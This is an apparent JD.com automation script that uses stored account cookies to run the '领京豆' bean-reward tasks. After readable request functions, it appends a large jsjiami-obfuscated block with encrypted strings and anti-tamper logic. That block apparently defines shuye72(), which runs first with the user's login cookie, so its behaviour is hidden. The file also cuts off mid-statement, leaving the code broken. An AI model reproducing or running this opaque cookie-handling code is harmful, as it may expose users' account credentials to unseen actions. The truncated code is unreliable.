/*
领京豆额外奖励&抢京豆
脚本自带助力码，介意者可将 29行 helpAuthor 变量设置为 false
活动入口：京东APP首页-领京豆
更新地址：https://gitee.com/lxk0301/jd_scripts/raw/master/jd_bean_home.js
已支持IOS双京东账号, Node.js支持N个京东账号
脚本兼容: QuantumultX, Surge, Loon, 小火箭，JSBox, Node.js
============Quantumultx===============
[task_local]
#领京豆额外奖励
10 7 * * * https://gitee.com/lxk0301/jd_scripts/raw/master/jd_bean_home.js, tag=领京豆额外奖励, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jd_bean_home.png, enabled=true

================Loon==============
[Script]
cron "10 7 * * *" script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_bean_home.js, tag=领京豆额外奖励

===============Surge=================
领京豆额外奖励 = type=cron,cronexp="10 7 * * *",wake-system=1,timeout=3600,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_bean_home.js

============小火箭=========
领京豆额外奖励 = type=cron,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_bean_home.js, cronexpr="10 7 * * *", timeout=3600, enable=true
 */
const $ = new Env('领京豆额外奖励');

const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let jdNotify = true;//是否关闭通知，false打开通知推送，true关闭通知推送
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '', message;
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {
  };
} else {
  let cookiesData = $.getdata('CookiesJD') || "[]";
  cookiesData = jsonParse(cookiesData);
  cookiesArr = cookiesData.map(item => item.cookie);
  cookiesArr.reverse();
  cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
  cookiesArr.reverse();
  cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
}
const JD_API_HOST = 'https://api.m.jd.com/';
!(async () => {
  $.newShareCodes = []
  // await getAuthorShareCode();
  // await getAuthorShareCode2();
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      message = '';
      await TotalBean();
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      await jdBeanHome();
    }
  }
  // for (let i = 0; i < cookiesArr.length; i++) {
  //   if (cookiesArr[i]) {
  //     $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
  //     console.log(`${$.UserName}去帮助下一个人`)
  //     cookie = cookiesArr[i];
  //     if ($.newShareCodes.length > 1) {
  //       let code = $.newShareCodes[(i + 1) % $.newShareCodes.length]
  //       await help(code[0], code[1])
  //     }
  //     if (helpAuthor && $.authorCode) {
  //       console.log(`去帮助作者`)
  //       const helpRes = await help($.authorCode[0], $.authorCode[1])
  //       if (helpRes && helpRes.data.respCode === 'SG209') {
  //         console.log(`助力次数已耗尽，跳出助力`)
  //         break;
  //       }
  //     }
  //     if (helpAuthor && $.authorCode2) {
  //       for (let code of $.authorCode2) {
  //         const helpRes = await help(code.shareCode, code.groupCode);
  //         if (helpRes && helpRes.data.respCode === 'SG209') {
  //           console.log(`助力次数已耗尽，跳出助力`)
  //           break;
  //         }
  //       }
  //     }
  //   }
  // }
})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

async function jdBeanHome() {
  await shuye72()
  $.doneState = false
  // for (let i = 0; i < 3; ++i) {
  //   await doTask2()
  //   await $.wait(1000)
  //   if ($.doneState) break
  // }
  do {
    await doTask2()
    await $.wait(3000)
  } while (!$.doneState)
  await $.wait(1000)
  await award("feeds")
  await $.wait(1000)
  await getUserInfo()
  await $.wait(1000)
  await getTaskList()
  await getTaskList();
  await receiveJd2();
  await showMsg();
}

function getRandomInt(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min)) + min;
}
function doTask2() {
    return new Promise(resolve => {
      const body = {"awardFlag": false, "skuId": `${getRandomInt(10000000,20000000)}`, "source": "feeds", "type": '1'};
      $.post(taskUrl('beanHomeTask', body), (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if (data.code === '0' && data.data){
                console.log(`任务完成进度：${data.data.taskProgress} / ${data.data.taskThreshold}`)
                if(data.data.taskProgress === data.data.taskThreshold)
                  $.doneState = true
              } else if (data.code === '0' && data.errorCode === 'HT201') {
                $.doneState = true
              } else {
                //HT304风控用户
                $.doneState = true
                console.log(`做任务异常：${JSON.stringify(data)}`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve();
        }
      })
    })
}

function getAuthorShareCode() {
  return new Promise(resolve => {
    $.get({url: "",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
        } else {
          $.authorCode = data.replace('\n', '').split(' ')
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function getAuthorShareCode2() {
  return new Promise(resolve => {
    $.get({url: "",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
        } else {
          if (safeGet(data)) {
            $.authorCode2 = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function getUserInfo() {
  return new Promise(resolve => {
    $.post(taskUrl('signBeanGroupStageIndex', 'body'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if(data.data.jklInfo) {
              $.actId = data.data.jklInfo.keyId
              let {shareCode, groupCode} = data.data
              if (!shareCode) {
                console.log(`未获取到助力码，去开团`)
                await hitGroup()
              } else {
                console.log(shareCode, groupCode)
                // 去做逛会场任务
                if (data.data.beanActivityVisitVenue.taskStatus === '0') {
                  await help(shareCode, groupCode, 1)
                }
                $.newShareCodes.push([shareCode, groupCode])
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function hitGroup() {
  return new Promise(resolve => {
    const body = {"activeType": 2,};
    $.get(taskGetUrl('signGroupHit', body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.data.respCode === "SG150") {
              let {shareCode, groupCode} = data.data.signGroupMain
              if (shareCode) {
                $.newShareCodes.push([shareCode, groupCode])
                console.log('开团成功')
                await help(shareCode, groupCode, 1)
              } else {
                console.log(`为获取到助力码，错误信息${JSON.stringify(data.data)}`)
              }
            } else {
              console.log(`开团失败，错误信息${JSON.stringify(data.data)}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function help(shareCode, groupCode, isTask = 0) {
  return new Promise(resolve => {
    const body = {
      "activeType": 2,
      "groupCode": groupCode,
      "shareCode": shareCode,
      "activeId": $.actId,
    };
    if (isTask) {
      console.log(`【抢京豆】做任务获取助力`)
      body['isTask'] = "1"
    } else {
      console.log(`【抢京豆】去助力好友${shareCode}`)
      body['source'] = "guest"
    }
    $.get(taskGetUrl('signGroupHelp', body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`【抢京豆】${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            console.log(`【抢京豆】${data.data.helpToast}`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
var _0xodn='jsjiami.com.v6',_0xa89e=[_0xodn,'wp55wpxOFsORwrU=','agTClsKnCg==','XcKEw6gBwonCow==','wqcww6h6Yw==','wpdSw7pEOg==','Gm9OasKN','YE7Dhg==','YkDDjMOG','KjjCn8O36K2N5rOe5aeB6LeD77ya6K6w5qKV5p2657y86LWS6YeE6K+w','wp/DlcO6w45xwqQb','AcKBacKyVA==','BAAFYw==','IsK3fcK5RQ==','wozDvMOJDA==','PxQlcFg=','fVvDuMO6w4E=','W8OrVMOfwojDjw==','Q8OywrJhw5M=','NRHCpFTCjQ==','DVvCtsO9wrE=','eUjDs8KjKcOC','ZcKEw7U8wog=','AcKnaMK9dw==','bCHDscKhJkjDi8KuDCnDsMKmLmoVwrB5w5pqw4JnwpPCoT9fH8KvBwfCusKiwq5MdDLDuCRXwrYbw5DCq8OoUWNtIn8qGjojwonDkDEfwrzCrnUzekFhVnLDnMKzwpDCqg3DgQ==','AXnCrcO4wpjCr1Zfw7/CicKeV8OpwqrCu2bCpF/DssOUTSsPCC7Do8OjPXHChhrDuzQrw4bDksOTcMKvFcOkwoDDgyJgwrrCssKiwo9/FyfDt8Owa8KHw4/DssOHw6rDkcKRw5HClcOtw7plf8KwwqfCgWbDhyccwonDsVsfw7HCp2sXwojCjRlEVMKBw6sawoTCgsO7wowGwoUHwqrCgjHCsWzCt8KRwq9ew5zDuQXCrlVgwp59w6jCmsKgwp7CtE/CoBPDqsOJw67Cr8OYw4fCmh8KSBdbwo9+ZAzChmN4w5jClXTDvMOewqUhwqxOwpzCosK1V8KP','wpzDkcO6','XMOQSsObwpM=','NUbCgsOZwqY=','JMK5ZMKzVg==','U8KUw48Iw6w=','w67Dh8O3wpIL','R8OlQcOpwp8=','LsKlXBw=','FTTCoF/CoMK5woI=','wpE1bsKAGQ==','D8OAbVFE','NsKQeMK2dwVm','wpfDkcOgw4hCwqk=','fMOQwrwqwrs=','VcKAw7IHwrrCrgI=','X1HDhMOGw5Y=','aDDDq8K2IRo=','JcOEwoxMKA==','woAAJAQ=','wrtnw4dKKA==','YE7DhsOmw4DCjQ==','TCTDgsKHwos=','TTbCicKIGw==','OcKyRsK7Xg==','U8KPwodIAA==','MjEObmk=','w4wtD8OmUg==','CVLCs8Oowrg=','MltjD8KFw6jCoGfDv8KywrbCsQ==','WATCg8KuB1jCtGDDrsKvI8K/w77CnsO+GcKZHBnDmMOzwrrClnlMwrsmGcO2w5PChGvChg==','wptowphDOMOXwqBWewsswrfCoF5MKxgCwp82wrvCnsKJw7IqdMOJw4F7HWzCg8KB','F8OKNSfCjSl2RGFFwojCnm9YYjJkOXB9woHCgA7DiC0LTcKp','FllqO14=','YjnCncOCwqvClmQ1wpjDuMOvMMKEwo3Cv10=','fcOXZsOb','w6xscMOoGsOcJkBUAMKEfFvDhTfDiCsVahvDnGMVC8KTBsOwHcKaOsOmwp3Cozw+dMOCDsOoworDmsK+w74zT10awrzCgsKRbk7CssKvwqFnWcK7wpjCoFBKOzjCgx/DjA3CvsOow4/CicOIw7/Cu3kuw7HDqcKQwqfDkMK3XMKqw7EzwrYhwprDjcOEwqPCkcKzeyrDtsKBw71BwonDo8O1dMKWRsKTDcOQwrrDhyTChEfDucK/woXClsO9UsKUwoo/wpnDmEdMV8Oowr3Ds8OYKR/CmgwqAzzDv0bDkMK3wozCkRFVfH7Dkg/CqgE=','GxUYZ23Cr8KYRMOxw4wOwpUSw73CrUljw59swpDCijZhQFhwwpHCgMO8','TxrDi8K+EA==','RsOhwpU8wrU=','b8Khwr1WBw==','worDmHw0fsOUwr5SOA==','w6Bgw5DCiRQuwqLCkBpBBnjDmBTDtMKywpcEwotKM8O/QXo=','w7YRw6PDj8Oc','eifDvMKzwro=','RmTDrMOaw6U=','bcKCwqTDuE4=','FcO4wrNTGA==','GCbCmlHCg8K5','RknCiA==','YMONwrIzw7vCsMKjwrvCp8K2DsKkwrM=','aU/Dlw==','eMOVwqRew7A0EMOPOA99MAo=','M8KQbsKWXg==','ZMO7wrskw5k=','w5DDmsKfD23CmxXChUY/','wqxjYMOgD8OJNw==','wprDhsKdUsOH','ci7DrMKnwo42TA==','YkhYw7jDvA==','Zm3DoMKNCw==','wqxCwrJtOA==','w65hw4rCmhN9w6LDkTJVUh/Dm0zDt8Kiw5whwpZOecKuUQYRNV5lBmPDucK7Owh6wo1XP8OHO8OJw7c8wp/CjSPDgwo3wqTCsMKRJzp/YiQQw6AAwo7CoDJOw5BIw5LDm8KfWn/DqsKiwpPChcOow7d4QsKYAsKxPHIxwonCksKnw51Awp3CssKfRA==','U3nDtl3Cj8K9wpjDhjNZbhphw4zCmcKRw5LDpcKlwqsdGMOYCRcLb17DtMK9csKrdhnDm8OFQmPDqMKkXDnDkmJmwoXCiT0MwoR6K8OGcWp+OCHCp1wyAsOMScKRMMKQJBfCqsKRc8Odw63CiEZFwqrCrRZ3GsKJNcOHHsKgwoTDhsOXFcK6woUgLGw1w4MrVMOeXsOYwq9BwqlleC9wCQRHM07ClMKhUsKPd2s/w5p1cXHCpMOdb2HCjMKXwpUvNMK5woXCv8OywpXCjsK4woImJsOWbQnChMK4woddw7wuXsK1woF8w5FVLsOvwrXCiMKgwqPDtsOaR8KdwrTCvmMLwqHDrsOzwqXDmWxvcG8kL8KKLyDDv8Oqw7fCpcOpasKVXcOtYsK2DsKlwpjCoHdzQxLCsXPCjsKNPx7CrXgYw44tw4g6KzLDocOgwosieyExaSZPw70gRzbDhUsoVDrCrQE9wo18QMK7w6JEWF3DvMOxXMOyw67Cr8KkBWjDhh7DicOuwpXCvw==','wrMvw49M','RxPCqMOzw68=','csKEw7Ykw4w=','wrbDnGEufw==','B8KbZ8KkRQ==','Y8O7wowcwpI=','wq3DsMOKw6Z5','wpUEw7hxWQ==','YMOZwoI=','w6vDksOqwoQ=','w6tHRMON6K6Z5rO/5aWn6LSV772j6K6e5qCU5p+4572u6LSR6YeJ6Kyz','X8KQwqzDs2k=','SwVP','XMOnwpZu','NsKgw6wL6K2X5rCS5aSM6LWc776x6K2a5qKq5p6/57256LeE6YWB6Kyw','G1JGUMKi','FB7Cs1fClQ==','TsOqWcOvwpM=','dkbDh8KCIw==','wrtnZsO3Cw==','W8OrVA==','w74qDMKT','UyA8Xuivqeazl+Wmhui1ju++lOitleaiuOacmee8t+i1t+mFjeivrg==','wobDm8KUY8OXwrI=','NMOxDzjCuw==','w63DvMOswoPDtg==','R8K+wrXDokk=','XsK9wq7Dlks=','Q8Kewrk=','S8KXwqBB','Byt4w5ToravmsKvlpKfot7nvv6/orbvmoKrmnbbnvoDotqrphL/orYc=','w7TDhcKqC3U=','a2zDg8ORw74=','wocqw5JscQ==','woRqXMO0PA==','SQx/w6nDkA==','wqZZw6tDHA==','IykdYlE=','wqIww5UWe8OFYMOrBcKPwr4S','RMKGwr1ICw/CrsKRw5fDl8O2wqwJAMK2N8KoPMKSaCMyJsKhCsKYUgl+XcOIRsO0','VsO0Q8O2wpPDnsOfRMOrw4MbTMO/w6rCrMObUT9ybMK6RXXDl8KiR8OHegPDtBbCscKX','wqY+w6vDh8OuUMO5w5tpBcOoIRksw4Yswp7Dlg83U8Ocwp/DpXQ=','byPCtcKgwoE=','BMKxwqc1w7fCoMKiwqHCtMKuCsKtwqLCjnnDsg==','wqnDpV8c','Z8KuVRXCo18Rw5oiHsOEwr8xBcOsU8K6wql1V2/CtMOAwrJIwpxrQW/DlDATeMOGNMOmw7wNDT3Cm8KDw4LDtcKnwpR0D8OJW8OZZDBAwp7DjTHCozHDr8KuwoFjwqrDl1TDoCJgaFTDtRokOcKGKsKhwobCq1fDi8OiAsOATEUoBGbCqWnDiBYdejzCl8OqX3XDm8OVw4LCt8OYbTI4w4Q5w6dPwrBxN8Kywot0U8Oww5o7dmPDpsKGTl0uwoEFLcKUw6wNfStUwrXDtCUMwrjCmsOGFXdDw4/CkGXDjWM=','w7sDNMK8w7g=','JEQuLkM=','J3Y2M1U=','wpUuw4pwVw==','w6F6w5LCkBNxw7/Dth8=','woLDgMKHVsOWw7rDmU7DnG5MYy/ClMOaaXwfwpILc8OhJcOR','OngzKmE=','VcOmwqgawpU=','dAzCicKLNg==','wqhtwrpKPQ==','b8Kjwq5PDA==','wqJ1WsOrCsOY','d1RA','BkXCiMOEwqfChmUvwovDoMOrOcKV','w616w5I=','eMOjUMOtwr4=','woNHd8OMOg==','YsOXdsOIwqXDvMO5dcOMw7g=','K3PCo8O1wpXCt1Y=','MsOyChHClg==','wo3DkcKHQsOEwrTClw==','C8OhwrV/wrY=','IMKSZMKFcQ==','w6Bgw5DCiRQuwqLCkBpCHD/DklTDs8Kzw5cTw4pNeMOuVigMczJpGmPDucKsO1xRwoYO','bAzCocOdw47DtcKfwohfI2jDiwzDjmJswqvCncODZsKYwqV8L8KUwpLDpHAVccOww5DCtATDmGF6FcK+woHDlsOoVcO0w5ppeRo5w67ClMKcQcODw4dUUzPDp8KuWMOSw7scw4jCgcKQWHLDrsKYQ8KBQTVXw45NwqQrDcKZw6MnfyYUwrXCiWUqw4t5wqxbDMOfVsOmFgJnw4TDhcO3bsKncG5tGAvCoVg=','woYpw6bDgcOK','XcKSYyPCh2M8STIawoPCij1cPzBoKixiwoTDnA/DiXdFVsKleybCsMOGd8KiLD3Dv8OwDRwvOsOv','wpPDmXkp','w6k7PsOcWg==','w6nDncKDEkA=','w6RAw73CthU=','IhcHU0s=','w6Nhw5TCkh0=','w4DDh8O0wrM9','w6nDpsK9GEDCqA==','wrJ5w5k=','w6Z1w4nCnA==','wqXDiMKKFOivheaymOWlo+i3pe+8hOiunOaiq+aeo+e/oOi2qemEuuitmA==','woHDscOCw6FR','w7LDpcOKwrvDtA==','Rn7DmsKQEQ==','Vwtaw67DuQ==','HcO+SntB','wrJ5w5lKLVo=','ScKZwqphEB4=','Ui/Ds8KSwp4=','w7rDmEc=','RMO/woAD','A2bCrsK96K+E5rGD5aSf6LWG77286Kyq5qC35p+657yz6Les6Yek6Kys','MMKlQwrCsg==','TMK9wrLDsGE=','YyDDksKCwp0=','e8OCwocBwpQ=','KXt5RcK4','w58fCMKhw7o=','VyTDo8KULQ==','PF4zC3k=','w5LDpm/Ch3k=','RH7DrMKKNQ==','wq9OE1EqGSYzwoDCm8KtwqxBXld8wrZ8fcO+w5tMwqrCl3XCuX08GA3CoDbDnV/CgMONwow2w4PClsOPeMOOwroQw7x4AcO5w4XCqsOywrpHJVLDrVfCglXDknhtZcKaY0Frw5zCvQ==','NMOnf1xOalRkw7kbH8OKBMOiZsOcNcKKLMO0w4pbwoV2w5PCt8OUFCPDjzRRw5sdUgElw5jDjEDDu3Usw7k+DwHCgzkAAE82dMKLOjVwe8KQw4Ztw7vDo33Cq8O9TFgjRsKbWWZpwox4esOCbxTCgcKJWC87K3HDtsKOJcKdwqzCoGzCrMOGccKLwrUKw6ArdDBwXBlMSxUew40QDizDvMOewqLCoHRoZ8KTX8Odwq1bwozDqg3Cs8O0w5nCksKLHsKzcsKME8Osw5vDg8Ktwqh1wqZofnHCiBvDlhTDkA==','NQwfRng=','w6cdBsKdw6o=','O8O6wqd8GA==','wrTDscOAw4hu','wqcCw5Z9cQ==','UArDssKWwoY=','wo7DtsKZY8OC','WmzCjMKZZQ==','wqLCvG3DtcOL','w7LDpcOgworDhQ==','TsK5wrHDo0o=','fD3Dg8K3Fg==','bXLDq8O0w4c=','UlHDgsKxFA==','ccOpQMOLwpw=','wp/Dn8OKPXY=','woc8w4zDhsOt','MxLCrWjCrA==','wrbDjsOt','PUpnRA==','EsOHwqtC6K2U5rCz5aWz6La177216K6/5qO45p6b57yP6LSk6YSM6K+o','w69xw5A=','w6onAMKnw40=','woxjBm8u','WsKUw7Ulw6Y=','w4TDuMOgwozDkg==','wr/DpMOAw5V6','wqxiw6lBKw==','BFhjUsKq','YjTDhsKzJA==','V8KAw4UEwow=','wqIlw7g=','wrTDgMOnwpU=','w4PDt1oU6K+95rOz5ae96LS+772Q6K6S5qGr5pyr572S6Le86YWe6K+E','KsOCwpl8wqwR','N0p+QMKvwqPCvg==','ZUbDpsKVPg==','DV3CsMO8wpU=','wqNbE0AeRn0=','wqIvw7HDkMOpAg==','PWLCnsO7woQ=','XMODwrc+wro=','w7UhKMOZeg==','IcKlSMK7RQ==','jMrWKtsWLZfjiaWkmi.com.v6=='];(function(_0x2d5fab,_0x22a76c,_0x2b6fa8){var _0x1af929=function(_0x100dc9,_0xf04ded,_0x1c2585,_0x527120,_0x5a254a){_0xf04ded=_0xf04ded>>0x8,_0x5a254a='po';var _0x384ade='shift',_0x3ec7e0='push';if(_0xf04ded<_0x100dc9){while(--_0x100dc9){_0x527120=_0x2d5fab[_0x384ade]();if(_0xf04ded===_0x100dc9){_0xf04ded=_0x527120;_0x1c2585=_0x2d5fab[_0x5a254a+'p']();}else if(_0xf04ded&&_0x1c2585['replace'](/[MrWKtWLZfWk=]/g,'')===_0xf04ded){_0x2d5fab[_0x3ec7e0](_0x527120);}}_0x2d5fab[_0x3ec7e0](_0x2d5fab[_0x384ade]());}return 0x7c3e1;};var _0x12a274=function(){var _0x56708c={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x3453e0,_0x4d72fb,_0x35210c,_0x519247){_0x519247=_0x519247||{};var _0x263eea=_0x4d72fb+'='+_0x35210c;var _0x355488=0x0;for(var _0x355488=0x0,_0x9ba387=_0x3453e0['length'];_0x355488<_0x9ba387;_0x355488++){var _0x4fad2a=_0x3453e0[_0x355488];_0x263eea+=';\x20'+_0x4fad2a;var _0xe78eac=_0x3453e0[_0x4fad2a];_0x3453e0['push'](_0xe78eac);_0x9ba387=_0x3453e0['length'];if(_0xe78eac!==!![]){_0x263eea+='='+_0xe78eac;}}_0x519247['cookie']=_0x263eea;},'removeCookie':function(){return'dev';},'getCookie':function(_0x4df8c6,_0x3277de){_0x4df8c6=_0x4df8c6||function(_0x51a217){return _0x51a217;};var _0x34b78a=_0x4df8c6(new RegExp('(?:^|;\x20)'+_0x3277de['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x128f4e=typeof _0xodn=='undefined'?'undefined':_0xodn,_0x336e5d=_0x128f4e['split'](''),_0x1e8db7=_0x336e5d['length'],_0x22cd3f=_0x1e8db7-0xe,_0x352380;while(_0x352380=_0x336e5d['pop']()){_0x1e8db7&&(_0x22cd3f+=_0x352380['charCodeAt']());}var _0x4c52cb=function(_0x29ca27,_0x39b488,_0x2232e0){_0x29ca27(++_0x39b488,_0x2232e0);};_0x22cd3f^-_0x1e8db7===-0x524&&(_0x352380=_0x22cd3f)&&_0x4c52cb(_0x1af929,_0x22a76c,_0x2b6fa8);return _0x352380>>0x2===0x14b&&_0x34b78a?decodeURIComponent(_0x34b78a[0x1]):undefined;}};var _0x4e8059=function(){var _0x11fee3=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x11fee3['test'](_0x56708c['removeCookie']['toString']());};_0x56708c['updateCookie']=_0x4e8059;var _0x31d6dd='';var _0x46245c=_0x56708c['updateCookie']();if(!_0x46245c){_0x56708c['setCookie'](['*'],'counter',0x1);}else if(_0x46245c){_0x31d6dd=_0x56708c['getCookie'](null,'counter');}else{_0x56708c['removeCookie']();}};_0x12a274();}(_0xa89e,0x11e,0x11e00));var _0x1c4c=function(_0x3c6684,_0x561381){_0x3c6684=~~'0x'['concat'](_0x3c6684);var _0x1fa8ff=_0xa89e[_0x3c6684];if(_0x1c4c['QvkNFy']===undefined){(function(){var _0x5783d9=function(){var _0x53ea3;try{_0x53ea3=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x36c831){_0x53ea3=window;}return _0x53ea3;};var _0x95888f=_0x5783d9();var _0x49d04e='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x95888f['atob']||(_0x95888f['atob']=function(_0x512544){var _0x5f4b3e=String(_0x512544)['replace'](/=+$/,'');for(var _0xa332d5=0x0,_0x908e84,_0xeba80,_0x57bc48=0x0,_0x4926b3='';_0xeba80=_0x5f4b3e['charAt'](_0x57bc48++);~_0xeba80&&(_0x908e84=_0xa332d5%0x4?_0x908e84*0x40+_0xeba80:_0xeba80,_0xa332d5++%0x4)?_0x4926b3+=String['fromCharCode'](0xff&_0x908e84>>(-0x2*_0xa332d5&0x6)):0x0){_0xeba80=_0x49d04e['indexOf'](_0xeba80);}return _0x4926b3;});}());var _0x1b3ec9=function(_0x4ea307,_0x561381){var _0xd3ea51=[],_0x5b7b23=0x0,_0x336199,_0x408e74='',_0x4ab311='';_0x4ea307=atob(_0x4ea307);for(var _0x5a69d8=0x0,_0x32e283=_0x4ea307['length'];_0x5a69d8<_0x32e283;_0x5a69d8++){_0x4ab311+='%'+('00'+_0x4ea307['charCodeAt'](_0x5a69d8)['toString'](0x10))['slice'](-0x2);}_0x4ea307=decodeURIComponent(_0x4ab311);for(var _0xf89041=0x0;_0xf89041<0x100;_0xf89041++){_0xd3ea51[_0xf89041]=_0xf89041;}for(_0xf89041=0x0;_0xf89041<0x100;_0xf89041++){_0x5b7b23=(_0x5b7b23+_0xd3ea51[_0xf89041]+_0x561381['charCodeAt'](_0xf89041%_0x561381['length']))%0x100;_0x336199=_0xd3ea51[_0xf89041];_0xd3ea51[_0xf89041]=_0xd3ea51[_0x5b7b23];_0xd3ea51[_0x5b7b23]=_0x336199;}_0xf89041=0x0;_0x5b7b23=0x0;for(var _0x1272f2=0x0;_0x1272f2<_0x4ea307['length'];_0x1272f2++){_0xf89041=(_0xf89041+0x1)%0x100;_0x5b7b23=(_0x5b7b23+_0xd3ea51[_0xf89041])%0x100;_0x336199=_0xd3ea51[_0xf89041];_0xd3ea51[_0xf89041]=_0xd3ea51[_0x5b7b23];_0xd3ea51[_0x5b7b23]=_0x336199;_0x408e74+=String['fromCharCode'](_0x4ea307['charCodeAt'](_0x1272f2)^_0xd3ea51[(_0xd3ea51[_0xf89041]+_0xd3ea51[_0x5b7b23])%0x100]);}return _0x408e74;};_0x1c4c['zQrLmY']=_0x1b3ec9;_0x1c4c['ODtQCU']={};_0x1c4c['QvkNFy']=!![];}var _0x45cd66=_0x1c4c['ODtQCU'][_0x3c6684];if(_0x45cd66===undefined){if(_0x1c4c['mpuLXU']===undefined){var _0x1cf06c=function(_0x3f5639){this['sczDSI']=_0x3f5639;this['zgylai']=[0x1,0x0,0x0];this['MlyFrm']=function(){return'newState';};this['XvbJad']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['bdbZqG']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x1cf06c['prototype']['uMzrNW']=function(){var _0x4d0446=new RegExp(this['XvbJad']+this['bdbZqG']);var _0x507a14=_0x4d0446['test'](this['MlyFrm']['toString']())?--this['zgylai'][0x1]:--this['zgylai'][0x0];return this['PvYayE'](_0x507a14);};_0x1cf06c['prototype']['PvYayE']=function(_0x73daaa){if(!Boolean(~_0x73daaa)){return _0x73daaa;}return this['VXuInV'](this['sczDSI']);};_0x1cf06c['prototype']['VXuInV']=function(_0x75328d){for(var _0x3c283e=0x0,_0x58903b=this['zgylai']['length'];_0x3c283e<_0x58903b;_0x3c283e++){this['zgylai']['push'](Math['round'](Math['random']()));_0x58903b=this['zgylai']['length'];}return _0x75328d(this['zgylai'][0x0]);};new _0x1cf06c(_0x1c4c)['uMzrNW']();_0x1c4c['mpuLXU']=!![];}_0x1fa8ff=_0x1c4c['zQrLmY'](_0x1fa8ff,_0x561381);_0x1c4c['ODtQCU'][_0x3c6684]=_0x1fa8ff;}else{_0x1fa8ff=_0x45cd66;}return _0x1fa8ff;};var _0x3641eb=function(){var _0x230ab2=!![];return function(_0x585eb8,_0x17e896){var _0x2b4de7=_0x230ab2?function(){if(_0x17e896){var _0x4c9750=_0x17e896['apply'](_0x585eb8,arguments);_0x17e896=null;return _0x4c9750;}}:function(){};_0x230ab2=![];return _0x2b4de7;};}();var _0xbea20=_0x3641eb(this,function(){var _0x3cc711=function(){return'\x64\x65\x76';},_0x5d727d=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x4b73c8=function(){var _0x2fff5c=new 